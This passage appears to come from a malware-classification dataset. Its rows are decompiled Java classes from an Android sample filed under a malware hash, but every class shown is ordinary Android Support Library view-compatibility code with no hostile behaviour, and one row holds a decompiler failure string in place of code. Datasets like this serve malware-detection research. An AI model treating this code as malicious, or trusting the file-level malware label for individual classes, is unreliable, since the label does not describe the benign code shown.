AccessibilityDelegateCompat accessibilityDelegateCompat);     void setAccessibilityLiveRegion(    View view,    int i);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setLabelFor(    View view,    int i);     void setLayerPaint(    View view,    Paint paint);     void setLayerType(    View view,    int i,    Paint paint);     void setLayoutDirection(    View view,    int i);     void setOverScrollMode(    View view,    int i);   } static class BaseViewCompatImpl implements ViewCompatImpl {     BaseViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return false;     }     @Override public boolean canScrollVertically(    View v,    int direction){       return false;     }     @Override public int getOverScrollMode(    View v){       return 2;     }     @Override public void setOverScrollMode(    View v,    int mode){     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){     }     @Override public void postInvalidateOnAnimation(    View view){       view.postInvalidateDelayed(getFrameTime());     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       view.postDelayed(action,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       view.postDelayed(action,getFrameTime() + delayMillis);     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public void setImportantForAccessibility(    View view,    int mode){     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return false;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }     @Override public float getAlpha(    View view){       return 1.0f;     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){     }     @Override public int getLayerType(    View view){       return 0;     }     @Override public int getLabelFor(    View view){       return 0;     }     @Override public void setLabelFor(    View view,    int id){     }     @Override public void setLayerPaint(    View view,    Paint p){     }     @Override public int getLayoutDirection(    View view){       return 0;     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){     }     @Override public ViewParent getParentForAccessibility(    View view){       return view.getParent();     }     @Override public boolean isOpaque(    View view){       Drawable bg=view.getBackground();       return bg != null && bg.getOpacity() == -1;     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return View.resolveSize(size,measureSpec);     }     @Override public int getMeasuredWidthAndState(    View view){       return view.getMeasuredWidth();     }     @Override public int getMeasuredHeightAndState(    View view){       return view.getMeasuredHeight();     }     @Override public int getMeasuredState(    View view){       return 0;     }     @Override public int getAccessibilityLiveRegion(    View view){       return 0;     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){     }   } static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {     EclairMr1ViewCompatImpl(){     }     @Override public boolean isOpaque(    View view){       return ViewCompatEclairMr1.isOpaque(view);     }   } static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View v){       return ViewCompatGingerbread.getOverScrollMode(v);     }     @Override public void setOverScrollMode(    View v,    int mode){       ViewCompatGingerbread.setOverScrollMode(v,mode);     }   } static class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }     @Override public float getAlpha(    View view){       return ViewCompatHC.getAlpha(view);     }     @Override public void setLayerType(    View view,    int layerType,    Paint paint){       ViewCompatHC.setLayerType(view,layerType,paint);     }     @Override public int getLayerType(    View view){       return ViewCompatHC.getLayerType(view);     }     @Override public void setLayerPaint(    View view,    Paint paint){       setLayerType(view,getLayerType(view),paint);       view.invalidate();     }     @Override public int resolveSizeAndState(    int size,    int measureSpec,    int childMeasuredState){       return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);     }     @Override public int getMeasuredWidthAndState(    View view){       return ViewCompatHC.getMeasuredWidthAndState(view);     }     @Override public int getMeasuredHeightAndState(    View view){       return ViewCompatHC.getMeasuredHeightAndState(view);     }     @Override public int getMeasuredState(    View view){       return ViewCompatHC.getMeasuredState(view);     }   } static class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return ViewCompatICS.canScrollHorizontally(v,direction);     }     @Override public boolean canScrollVertically(    View v,    int direction){       return ViewCompatICS.canScrollVertically(v,direction);     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onPopulateAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onInitializeAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){       ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){       ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());     }   } static class JBViewCompatImpl extends ICSViewCompatImpl {     JBViewCompatImpl(){     }     @Override public boolean hasTransientState(    View view){       return ViewCompatJB.hasTransientState(view);     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){       ViewCompatJB.setHasTransientState(view,hasTransientState);     }     @Override public void postInvalidateOnAnimation(    View view){       ViewCompatJB.postInvalidateOnAnimation(view);     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       ViewCompatJB.postInvalidateOnAnimation(view,left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       ViewCompatJB.postOnAnimation(view,action);     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       ViewCompatJB.postOnAnimationDelayed(view,action,delayMillis);     }     @Override public int getImportantForAccessibility(    View view){       return ViewCompatJB.getImportantForAccessibility(view);     }     @Override public void setImportantForAccessibility(    View view,    int mode){       ViewCompatJB.setImportantForAccessibility(view,mode);     }     @Override public boolean performAccessibilityAction(    View view,    int action,    Bundle arguments){       return ViewCompatJB.performAccessibilityAction(view,action,arguments);     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       Object compat=ViewCompatJB.getAccessibilityNodeProvider(view);       if (compat != null) {         return new AccessibilityNodeProviderCompat(compat);       }       return null;     }     @Override public ViewParent getParentForAccessibility(    View view){       return ViewCompatJB.getParentForAccessibility(view);     }   } static class JbMr1ViewCompatImpl extends JBViewCompatImpl {     JbMr1ViewCompatImpl(){     }     @Override public int getLabelFor(    View view){       return ViewCompatJellybeanMr1.getLabelFor(view);     }     @Override public void setLabelFor(    View view,    int id){       ViewCompatJellybeanMr1.setLabelFor(view,id);     }     @Override public void setLayerPaint(    View view,    Paint paint){       ViewCompatJellybeanMr1.setLayerPaint(view,paint);     }     @Override public int getLayoutDirection(    View view){       return ViewCompatJellybeanMr1.getLayoutDirection(view);     }     @Override public void setLayoutDirection(    View view,    int layoutDirection){       ViewCompatJellybeanMr1.setLayoutDirection(view,layoutDirection);     }   } static class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {     KitKatViewCompatImpl(){     }     @Override public int getAccessibilityLiveRegion(    View view){       return ViewCompatKitKat.getAccessibilityLiveRegion(view);     }     @Override public void setAccessibilityLiveRegion(    View view,    int mode){       ViewCompatKitKat.setAccessibilityLiveRegion(view,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatViewCompatImpl();       return;     }     if (version >= 17) {       IMPL=new JbMr1ViewCompatImpl();       return;     }     if (version >= 16) {       IMPL=new JBViewCompatImpl();       return;     }     if (version >= 14) {       IMPL=new ICSViewCompatImpl();       return;     }     if (version >= 11) {       IMPL=new HCViewCompatImpl();     }  else     if (version >= 9) {       IMPL=new GBViewCompatImpl();     }  else {       IMPL=new BaseViewCompatImpl();     }   }   public static boolean canScrollHorizontally(  View v,  int direction){     return IMPL.canScrollHorizontally(v,direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return IMPL.canScrollVertically(v,direction);   }   public static int getOverScrollMode(  View v){     return IMPL.getOverScrollMode(v);   }   public static void setOverScrollMode(  View v,  int overScrollMode){     IMPL.setOverScrollMode(v,overScrollMode);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(v,event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(v,info);   }   public static void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){     IMPL.setAccessibilityDelegate(v,delegate);   }   public static boolean hasTransientState(  View view){     return IMPL.hasTransientState(view);   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     IMPL.setHasTransientState(view,hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     IMPL.postInvalidateOnAnimation(view);   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     IMPL.postInvalidateOnAnimation(view,left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     IMPL.postOnAnimation(view,action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     IMPL.postOnAnimationDelayed(view,action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return IMPL.getImportantForAccessibility(view);   }   public static void setImportantForAccessibility(  View view,  int mode){     IMPL.setImportantForAccessibility(view,mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return IMPL.performAccessibilityAction(view,action,arguments);   }   public static AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return IMPL.getAccessibilityNodeProvider(view);   }   public static float getAlpha(  View view){     return IMPL.getAlpha(view);   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     IMPL.setLayerType(view,layerType,paint);   }   public static int getLayerType(  View view){     return IMPL.getLayerType(view);   }   public static int getLabelFor(  View view){     return IMPL.getLabelFor(view);   }   public static void setLabelFor(  View view,  int labeledId){     IMPL.setLabelFor(view,labeledId);   }   public static void setLayerPaint(  View view,  Paint paint){     IMPL.setLayerPaint(view,paint);   }   public static int getLayoutDirection(  View view){     return IMPL.getLayoutDirection(view);   }   public static void setLayoutDirection(  View view,  int layoutDirection){     IMPL.setLayoutDirection(view,layoutDirection);   }   public static ViewParent getParentForAccessibility(  View view){     return IMPL.getParentForAccessibility(view);   }   public static boolean isOpaque(  View view){     return IMPL.isOpaque(view);   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return IMPL.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return IMPL.getMeasuredWidthAndState(view);   }   public static int getMeasuredHeightAndState(  View view){     return IMPL.getMeasuredHeightAndState(view);   }   public static int getMeasuredState(  View view){     return IMPL.getMeasuredState(view);   }   public int getAccessibilityLiveRegion(  View view){     return IMPL.getAccessibilityLiveRegion(view);   }   public void setAccessibilityLiveRegion(  View view,  int mode){     IMPL.setAccessibilityLiveRegion(view,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatEclairMr1.code","class ViewCompatEclairMr1 {   ViewCompatEclairMr1(){   }   public static boolean isOpaque(  View view){     return view.isOpaque();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatGingerbread.code","class ViewCompatGingerbread {   ViewCompatGingerbread(){   }   public static int getOverScrollMode(  View v){     return v.getOverScrollMode();   }   public static void setOverScrollMode(  View v,  int mode){     v.setOverScrollMode(mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatHC.code","class ViewCompatHC {   ViewCompatHC(){   }   public static long getFrameTime(){     return ValueAnimator.getFrameDelay();   }   public static float getAlpha(  View view){     return view.getAlpha();   }   public static void setLayerType(  View view,  int layerType,  Paint paint){     view.setLayerType(layerType,paint);   }   public static int getLayerType(  View view){     return view.getLayerType();   }   public static int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   public static int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidthAndState();   }   public static int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeightAndState();   }   public static int getMeasuredState(  View view){     return view.getMeasuredState();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View v,  int direction){     return v.canScrollHorizontally(direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return v.canScrollVertically(direction);   }   public static void setAccessibilityDelegate(  View v,  Object delegate){     v.setAccessibilityDelegate((View.AccessibilityDelegate)delegate);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onPopulateAccessibilityEvent(event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onInitializeAccessibilityEvent(event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  Object info){     v.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)info);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatImpl.code","interface ViewCompatImpl {   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   int getAccessibilityLiveRegion(  View view);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   float getAlpha(  View view);   int getImportantForAccessibility(  View view);   int getLabelFor(  View view);   int getLayerType(  View view);   int getLayoutDirection(  View view);   int getMeasuredHeightAndState(  View view);   int getMeasuredState(  View view);   int getMeasuredWidthAndState(  View view);   int getOverScrollMode(  View view);   ViewParent getParentForAccessibility(  View view);   boolean hasTransientState(  View view);   boolean isOpaque(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   int resolveSizeAndState(  int i,  int i2,  int i3);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setAccessibilityLiveRegion(  View view,  int i);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setLabelFor(  View view,  int i);   void setLayerPaint(  View view,  Paint paint);   void setLayerType(  View view,  int i,  Paint paint);   void setLayoutDirection(  View view,  int i);   void setOverScrollMode(  View view,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatJB.code","class ViewCompatJB {   ViewCompatJB(){   }   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     view.setHasTransientState(hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidate(left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     view.postOnAnimation(action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postOnAnimationDelayed(action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static void setImportantForAccessibility(  View view,  int mode){     view.setImportantForAccessibility(mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return view.performAccessibilityAction(action,arguments);   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   }   public static ViewParent getParentForAccessibility(  View view){     return view.getParentForAccessibility();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatJellybeanMr1.code","class ViewCompatJellybeanMr1 {   ViewCompatJellybeanMr1(){   }   public static int getLabelFor(  View view){     return view.getLabelFor();   }   public static void setLabelFor(  View view,  int id){     view.setLabelFor(id);   }   public static void setLayerPaint(  View view,  Paint paint){     view.setLayerPaint(paint);   }   public static int getLayoutDirection(  View view){     return view.getLayoutDirection();   }   public static void setLayoutDirection(  View view,  int layoutDirection){     view.setLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewCompatKitKat.code","public class ViewCompatKitKat {   public static int getAccessibilityLiveRegion(  View view){     return view.getAccessibilityLiveRegion();   }   public static void setAccessibilityLiveRegion(  View view,  int mode){     view.setAccessibilityLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return config.getScaledTouchSlop();     }   } static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return IMPL.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompat.code","public class ViewGroupCompat {   static final ViewGroupCompatImpl IMPL;   public static final int LAYOUT_MODE_CLIP_BOUNDS=0;   public static final int LAYOUT_MODE_OPTICAL_BOUNDS=1; interface ViewGroupCompatImpl {     int getLayoutMode(    ViewGroup viewGroup);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void setLayoutMode(    ViewGroup viewGroup,    int i);     void setMotionEventSplittingEnabled(    ViewGroup viewGroup,    boolean z);   } static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {     ViewGroupCompatStubImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return true;     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){     }     @Override public int getLayoutMode(    ViewGroup group){       return 0;     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){     }   } static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {     ViewGroupCompatHCImpl(){     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){       ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);     }   } static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {     ViewGroupCompatIcsImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);     }   } static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {     ViewGroupCompatJellybeanMR2Impl(){     }     @Override public int getLayoutMode(    ViewGroup group){       return ViewGroupCompatJellybeanMR2.getLayoutMode(group);     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){       ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 18) {       IMPL=new ViewGroupCompatJellybeanMR2Impl();       return;     }     if (version >= 14) {       IMPL=new ViewGroupCompatIcsImpl();     }  else     if (version >= 11) {       IMPL=new ViewGroupCompatHCImpl();     }  else {       IMPL=new ViewGroupCompatStubImpl();     }   }   private ViewGroupCompat(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(group,child,event);   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     IMPL.setMotionEventSplittingEnabled(group,split);   }   public static int getLayoutMode(  ViewGroup group){     return IMPL.getLayoutMode(group);   }   public static void setLayoutMode(  ViewGroup group,  int mode){     IMPL.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatHC.code","class ViewGroupCompatHC {   private ViewGroupCompatHC(){   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     group.setMotionEventSplittingEnabled(split);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatHCImpl.code","static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {   ViewGroupCompatHCImpl(){   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatIcs.code","class ViewGroupCompatIcs {   ViewGroupCompatIcs(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return group.onRequestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatIcsImpl.code","static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {   ViewGroupCompatIcsImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatImpl.code","interface ViewGroupCompatImpl {   int getLayoutMode(  ViewGroup viewGroup);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void setLayoutMode(  ViewGroup viewGroup,  int i);   void setMotionEventSplittingEnabled(  ViewGroup viewGroup,  boolean z); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatJellybeanMR2.code","class ViewGroupCompatJellybeanMR2 {   ViewGroupCompatJellybeanMR2(){   }   public static int getLayoutMode(  ViewGroup group){     return group.getLayoutMode();   }   public static void setLayoutMode(  ViewGroup group,  int mode){     group.setLayoutMode(mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatJellybeanMR2Impl.code","static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {   ViewGroupCompatJellybeanMR2Impl(){   }   @Override public int getLayoutMode(  ViewGroup group){     return ViewGroupCompatJellybeanMR2.getLayoutMode(group);   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){     ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewGroupCompatStubImpl.code","static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {   ViewGroupCompatStubImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return true;   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){   }   @Override public int getLayoutMode(  ViewGroup group){     return 0;   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@368ef831"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewParentCompat.code","public class ViewParentCompat {   static final ViewParentCompatImpl IMPL; interface ViewParentCompatImpl {     boolean requestSendAccessibilityEvent(    ViewParent viewParent,    View view,    AccessibilityEvent accessibilityEvent);   } static class ViewParentCompatStubImpl implements ViewParentCompatImpl {     ViewParentCompatStubImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       if (child == null) {         return false;       }       AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");       manager.sendAccessibilityEvent(event);       return true;     }   } static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {     ViewParentCompatICSImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ViewParentCompatICSImpl();     }  else {       IMPL=new ViewParentCompatStubImpl();     }   }   private ViewParentCompat(){   }   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return IMPL.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewParentCompatICS.code","public class ViewParentCompatICS {   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return parent.requestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewParentCompatICSImpl.code","static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {   ViewParentCompatICSImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewParentCompatImpl.code","interface ViewParentCompatImpl {   boolean requestSendAccessibilityEvent(  ViewParent viewParent,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewParentCompatStubImpl.code","static class ViewParentCompatStubImpl implements ViewParentCompatImpl {   ViewParentCompatStubImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     if (child == null) {       return false;     }     AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");     manager.sendAccessibilityEvent(event);     return true;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.view\ViewPositionComparator.code","public static class ViewPositionComparator implements Comparator<View> {   ViewPositionComparator(){   }   @Override public int compare(  View lhs,  View rhs){     LayoutParams llp=(LayoutParams)lhs.getLayoutParams();     LayoutParams rlp=(LayoutParams)rhs.getLayoutParams();     if (llp.isDecor != rlp.isDecor) {       return llp.isDecor ? 1 : -1;     }     return llp.position - rlp.position;   } } "
